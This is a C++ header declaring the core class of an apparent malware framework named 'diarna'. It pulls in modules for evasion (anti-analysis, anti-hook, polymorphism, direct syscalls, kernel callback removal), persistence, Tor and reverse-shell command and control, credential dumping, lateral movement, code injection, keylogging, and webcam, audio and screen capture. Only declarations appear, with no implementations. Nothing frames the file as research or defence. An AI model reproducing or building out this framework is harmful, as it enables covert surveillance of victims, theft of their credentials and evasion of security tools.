#pragma once
#include <diarna/compiler_port.hpp>
#include <diarna/core/config.hpp>
#include <diarna/crypto/chacha20.hpp>
#include <diarna/stealth/memory_vault.hpp>
#include <diarna/stealth/anti_analysis.hpp>
#include <diarna/stealth/anti_hook.hpp>
#include <diarna/stealth/polymorph.hpp>
#include <diarna/stealth/hells_gate.hpp>
#include <diarna/stealth/nanomite.hpp>
#include <diarna/stealth/rop_engine.hpp>
#include <diarna/stealth/kernel_ops.hpp>
#include <diarna/stealth/firmware.hpp>
#include <diarna/stealth/forensics.hpp>
#include <diarna/stealth/remap.hpp>
#include <diarna/persistence/manager.hpp>
#include <diarna/comm/tor_client.hpp>
#include <diarna/comm/reverse_shell.hpp>
#include <diarna/comm/protocol.hpp>
#include <diarna/collection/collector.hpp>
#include <diarna/collection/credential_harvester.hpp>
#include <diarna/movement/lateral.hpp>
#include <diarna/exec/injector.hpp>
#include <diarna/capture/capture.hpp>
#include <memory>
#include <atomic>
#include <thread>
#include <mutex>
#include <functional>
#include <chrono>

namespace diarna {

class DiarnaFramework {
public:
    explicit DiarnaFramework(Config config = default_config());
    ~DiarnaFramework();
    DiarnaFramework(const DiarnaFramework&) = delete;
    DiarnaFramework& operator=(const DiarnaFramework&) = delete;

    bool arm();
    bool deploy();
    void stand_down();
    bool is_active() const;

    collection::Keylogger& keylogger();
    collection::ClipboardMonitor& clipboard();
    collection::CredentialDumper& credentials();
    collection::CredentialHarvester& harvester();
    movement::LateralMovement& movement();
    comm::ReverseShell& shell();
    capture::Screenshot& screenshot();
    capture::Audio& audio();
    capture::Webcam& webcam();
    capture::WebRTCStreamer& webrtc();
    capture::DesktopDuplicator& desktop();

    struct Status {
        std::string agent_id; bool is_active; bool c2_connected;
        bool tor_ready; uint64_t uptime_sec; size_t vault_pages;
        uint64_t vault_accesses; uint64_t mutations_total;
        uint64_t injections_successful; uint64_t rop_gadgets;
        uint64_t nanomite_traps; bool peb_mirrored;
        uint64_t kernel_callbacks_removed;
        std::vector<std::string> active_persistence;
        std::vector<std::string> evasion_active;
        std::string sandbox_detection;
    };
    Status status() const;

private:
    Config config_;
    std::unique_ptr<crypto::ChaCha20Poly1305> crypto_;
    std::unique_ptr<persistence::PersistenceManager> persistence_;
    std::unique_ptr<comm::ReverseShell> shell_;
    std::unique_ptr<comm::C2Protocol> protocol_;
    std::unique_ptr<collection::Keylogger> keylogger_;
    std::unique_ptr<collection::ClipboardMonitor> clipboard_;
    std::unique_ptr<collection::CredentialDumper> credentials_;
    std::unique_ptr<collection::CredentialHarvester> harvester_;
    std::unique_ptr<movement::LateralMovement> movement_;
    std::unique_ptr<capture::Screenshot> screenshot_;
    std::unique_ptr<capture::Audio> audio_;
    std::unique_ptr<capture::Webcam> webcam_;
    std::unique_ptr<capture::WebRTCStreamer> webrtc_;
    std::unique_ptr<capture::DesktopDuplicator> desktop_;

    std::atomic<bool> active_{false};
    std::atomic<bool> armed_{false};
    std::thread main_thread_;
    std::chrono::steady_clock::time_point start_time_;

    void main_loop();
    void apply_stealth();
    void deploy_persistence();
    bool verify_environment();
    bool check_environment_key();
};

} // namespace diarna
